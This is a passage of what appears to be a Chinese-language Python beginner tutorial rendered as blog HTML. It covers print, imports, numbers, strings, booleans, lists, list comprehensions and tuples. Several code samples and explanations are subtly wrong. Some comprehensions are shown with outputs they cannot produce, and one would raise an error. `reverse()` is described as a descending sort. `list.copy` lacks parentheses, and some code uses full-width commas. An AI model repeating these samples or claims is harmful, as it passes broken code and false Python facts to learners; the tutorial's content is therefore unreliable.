class="string">&quot;a&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x )</span><br><span class="line"><span class="built_in">print</span>( y )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---------&#x27;</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>( y, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2><p>在 python 用 import 或者 from…import 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： import somemodule</p><p>从某个模块中导入某个函数,格式为： from somemodule import somefunction</p><p>从某个模块中导入多个函数,格式为： from somemodule import firstfunc, secondfunc, thirdfunc</p><p>将某个模块中的全部函数导入，格式为： from somemodule import * </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&quot;a&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x )</span><br><span class="line"><span class="built_in">print</span>( y )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---------&#x27;</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>( y, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p> Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</p><p>在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</p><p><strong>等号（&#x3D;）用来给变量赋值。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">counter = <span class="number">100</span>          <span class="comment"># 整型变量</span></span><br><span class="line">miles   = <span class="number">1000.0</span>       <span class="comment"># 浮点型变量</span></span><br><span class="line">name    = <span class="string">&quot;runoob&quot;</span>     <span class="comment"># 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (counter)</span><br><span class="line"><span class="built_in">print</span> (miles)</span><br><span class="line"><span class="built_in">print</span> (name)</span><br></pre></td></tr></table></figure><p><strong>多个变量赋值</strong><br>Python允许你同时为多个变量赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三个变量被赋予相同的数值</span></span><br><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"><span class="comment">#也可以为多个对象指定多个变量</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;runoob&quot;</span></span><br></pre></td></tr></table></figure><h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><p>Python3 中常见的数据类型有：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>bool（布尔类型）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><em>不可变数据（3 个）</em>：Number（数字）、String（字符串）、Tuple（元组）；</li><li><em>可变数据（3 个）</em>：List（列表）、Dictionary（字典）、Set（集合）<blockquote><p>此外还有一些高级的数据类型，如: 字节数组类型(bytes)。</p></blockquote></li></ul><h3 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h3><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p><ul><li>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li><li>bool (布尔), 如 True。</li><li>float (浮点数), 如 1.23、3E-2</li><li>complex (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> a = <span class="number">111</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="built_in">isinstance</span>(a, <span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="literal">True</span></span><br></pre></td></tr></table></figure><blockquote><p>isinstance 和 type 的区别在于：</p><ul><li>type()不会认为子类是一种父类类型。</li><li>isinstance()会认为子类是一种父类类型。</li></ul></blockquote><blockquote><p>注意：Python3 中，bool 是 int 的子类，True 和 False 可以和数字相加， True&#x3D;&#x3D;1、False&#x3D;&#x3D;0 会返回 True，但可以通过 is 来判断类型。</p></blockquote><p><strong>一些操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当你指定一个值时，Number 对象就会被创建：</span></span><br><span class="line">var1 = <span class="number">1</span></span><br><span class="line">var2 = <span class="number">10</span></span><br><span class="line"><span class="comment">#可以通过使用del语句删除单个或多个对象</span></span><br><span class="line"><span class="keyword">del</span> var</span><br><span class="line"><span class="keyword">del</span> var_a, var_b</span><br></pre></td></tr></table></figure><p><strong>数值运算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 5 + 4  # 加法</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; 4.3 - 2 # 减法</span><br><span class="line">2.3</span><br><span class="line">&gt;&gt;&gt; 3 * 7  # 乘法</span><br><span class="line">21</span><br><span class="line">&gt;&gt;&gt; 2 / 4  # 除法，得到一个浮点数</span><br><span class="line">0.5</span><br><span class="line">&gt;&gt;&gt; 2 // 4 # 除法，得到一个整数</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 17 % 3 # 取余</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 2 ** 5 # 乘方</span><br><span class="line">32</span><br></pre></td></tr></table></figure><h3 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h3><ul><li>Python 中单引号 ‘ 和双引号 “ 使用完全相同。</li><li>使用三引号(‘’’ 或 “””)可以指定一个多行字符串。</li><li>转义符 \。</li><li>反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r”this is a line with \n” 则 \n 会显示，并不是换行。</li><li>按字面意义级联字符串，如 “this “ “is “ “string” 会被自动转换为 this is string。</li><li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li><li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li><li>Python 中的字符串不能改变。</li><li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li><li>字符串的截取的语法格式如下：变量[头下标:尾下标:步长]</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>)          <span class="comment"># 输出字符串</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])    <span class="comment"># 输出第一个到倒数第二个的所有字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">0</span>])       <span class="comment"># 输出字符串第一个字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>])     <span class="comment"># 输出从第三个开始到第五个的字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">2</span>:])      <span class="comment"># 输出从第三个开始的后的所有字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span> * <span class="number">2</span>)      <span class="comment"># 输出字符串两次，也可以写成 print (2 * str)</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span> + <span class="string">&quot;TEST&quot;</span>) <span class="comment"># 连接字符串</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>R</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>noo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>noob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>RunoobRunoob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>RunoobTEST</span><br></pre></td></tr></table></figure><h3 id="bool（布尔类型）"><a href="#bool（布尔类型）" class="headerlink" title="bool（布尔类型）"></a>bool（布尔类型）</h3><p>布尔类型即 True 或 False。</p><p>在 Python 中，True 和 False 都是关键字，表示布尔值。</p><p>布尔类型可以用来控制程序的流程，比如判断某个条件是否成立，或者在某个条件满足时执行某段代码。</p><p>布尔类型特点：</p><ul><li><p>布尔类型只有两个值：True 和 False。</p></li><li><p>布尔类型可以和其他数据类型进行比较，比如数字、字符串等。在比较时，Python 会将 True 视为 1，False 视为 0。</p></li><li><p>布尔类型可以和逻辑运算符一起使用，包括 and、or 和 not。这些运算符可以用来组合多个布尔表达式，生成一个新的布尔值。</p></li><li><p>布尔类型也可以被转换成其他数据类型，比如整数、浮点数和字符串。在转换时，True 会被转换成 1，False 会被转换成 0。</p></li></ul><h3 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h3><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 <strong>[ ]</strong> 之间、用逗号分隔开的元素列表。</p><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p><p>列表截取的语法格式如下：</p><pre><code>变量[头下标:尾下标]</code></pre><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [ <span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span> ]</span><br><span class="line">tinylist = [<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>)            <span class="comment"># 输出完整列表</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">0</span>])         <span class="comment"># 输出列表第一个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">1</span>:<span class="number">3</span>])       <span class="comment"># 从第二个开始输出到第三个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">2</span>:])        <span class="comment"># 输出从第三个元素开始的所有元素</span></span><br><span class="line"><span class="built_in">print</span> (tinylist * <span class="number">2</span>)    <span class="comment"># 输出两次列表</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span> + tinylist) <span class="comment"># 连接列表</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abcd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">786</span>, <span class="number">2.23</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>以下实例用于翻转字符串</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverseWords</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 通过空格将字符串分隔符，把各个单词分隔为列表</span></span><br><span class="line">    inputWords = <span class="built_in">input</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 翻转字符串</span></span><br><span class="line">    <span class="comment"># 假设列表 list = [1,2,3,4],  </span></span><br><span class="line">    <span class="comment"># list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样)</span></span><br><span class="line">    <span class="comment"># inputWords[-1::-1] 有三个参数</span></span><br><span class="line">    <span class="comment"># 第一个参数 -1 表示最后一个元素</span></span><br><span class="line">    <span class="comment"># 第二个参数为空，表示移动到列表末尾</span></span><br><span class="line">    <span class="comment"># 第三个参数为步长，-1 表示逆向</span></span><br><span class="line">    inputWords=inputWords[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重新组合字符串</span></span><br><span class="line">    output = <span class="string">&#x27; &#x27;</span>.join(inputWords)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">input</span> = <span class="string">&#x27;I like runoob&#x27;</span></span><br><span class="line">    rw = reverseWords(<span class="built_in">input</span>)</span><br><span class="line">    <span class="built_in">print</span>(rw)</span><br></pre></td></tr></table></figure><h4 id="列表常用方法"><a href="#列表常用方法" class="headerlink" title="列表常用方法"></a>列表常用方法</h4><p>List 内置了有很多方法，例如 append()、pop() 等：</p><ul><li>List.append(x)：在列表末尾添加一个元素</li><li>List.extend([x,y,…])：在列表后扩展一个列表</li><li>List.insert(x,y)：在序号x位置处添加元素y</li><li>List.pop(x)：弹出序号x位置处的元素</li><li>List.clear()：清空列表</li><li>List.sort()：将元素从小到大排序</li><li>List.reverse()：将元素从大到小排序，效果等同于List.sort(reverse&#x3D;True)</li><li>List.count(x)：查找列表中元素x的数量</li><li>List.index(x)：查找列表中元素x的位置</li><li>List.copy：拷贝</li></ul><blockquote><p>因为列表可变，赋值的方式本质是让不同的变量指向同一个对象列表，而列表是可变的，这样会让在改变其中一个列表的值同时改动了其他列表</p></blockquote><blockquote><p>浅拷贝(两种形式)</p></blockquote><ol><li>list_copy1 &#x3D; list.copy</li><li>list_copy2 &#x3D; list[:]</li></ol><blockquote><p>浅拷贝只能拷贝外层的对象，列表多层嵌套时只能拷贝到其引用，此时要使用深拷贝</p></blockquote><blockquote><p>深拷贝(要引用py的copy库)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy </span><br><span class="line"><span class="comment">#浅拷贝</span></span><br><span class="line">x = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">y = copy.copy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; x</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; y</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#深拷贝</span></span><br><span class="line">x = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">y = copy.deepcopy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; x</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; y</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,5,6]，[7,8,9]]</span></span><br></pre></td></tr></table></figure><h4 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h4><p>形式：**[expression for target in iterable]**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原循环</span></span><br><span class="line">oho = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(oho)):</span><br><span class="line">    oho[i] = oho[i]*<span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;oho</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#现列表推导式</span></span><br><span class="line">oho = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">oho=[i*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(oho))]</span><br><span class="line">&gt;&gt;&gt;oho</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">matrix = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">          [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],</span><br><span class="line">          [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">col2  =[row[<span class="number">1</span>] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;col2</span><br><span class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">diag1 =[matrix[i][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;diag1</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">diag2 =[matrix[i][<span class="number">2</span>-i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;diag2</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><blockquote><p>利用列表推导式创建嵌套列表<br>s&#x3D; [ [0]*3 for i in range(3) ]</p></blockquote><blockquote><p>为列表推导式增加条件</p></blockquote><p>形式：**[expression for target in iterable if condition]**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">even = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">&gt;&gt;&gt;even</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>，<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">odd = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">&gt;&gt;&gt;odd</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>，<span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">words = [<span class="string">&quot;Great&quot;</span>,<span class="string">&quot;FishC&quot;</span>,<span class="string">&quot;Brilliant&quot;</span>,<span class="string">&quot;Excellent&quot;</span>,<span class="string">&quot;Fantistic&quot;</span>]fwords = [w <span class="keyword">for</span> w <span class="keyword">in</span> words <span class="keyword">if</span> w[<span class="number">0</span>] ==<span class="string">&#x27;F&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;fwords</span><br><span class="line">[<span class="string">&quot;FishC&quot;</span>,<span class="string">&quot;Fantistic&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h3><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。</p><p>元组中的元素类型也可以不相同： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span> = ( <span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>  )</span><br><span class="line">tinytuple = (<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>)             <span class="comment"># 输出完整元组</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">0</span>])          <span class="comment"># 输出元组的第一个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">1</span>:<span class="number">3</span>])        <span class="comment"># 输出从第二个元素开始到第三个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">2</span>:])         <span class="comment"># 输出从第三个元素开始的所有元素</span></span><br><span class="line"><span class="built_in">print</span> (tinytuple * <span class="number">2</span>)     <span class="comment"># 输出两次元组</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span> + tinytuple) <span class="comment"># 连接元组</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abcd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">786</span>, <span class="number">2.23</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br></pre></td></tr></table></figure><p>元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。</p><p>其实，可以把字符串看作一种特殊的元组。 修改元组元素的操作是非法的</p><blockquote><p>建立一个只有一个元素的元组： x&#x3D;(520,),其中逗号很关键</p></blockquote><blockquote><p>打包和解包</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打包</span></span><br><span class="line">t = (<span class="number">123</span>，<span class="string">&quot;Fishc&quot;</span>，<span class="number">3.14</span>)</span><br><span class="line">&gt;&gt;&gt;t</span><br><span class="line">(<span class="number">123</span>，<span class="string">&#x27;FishC&#x27;</span>，<span class="number">3.14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解包</span></span><br><span class="line">x，y，z= t</span><br><span class="line">&gt;&gt;&gt;X</span><br><span class="line"><span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"><span class="string">&#x27;FishC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Z</span></span><br><span class="line"><span 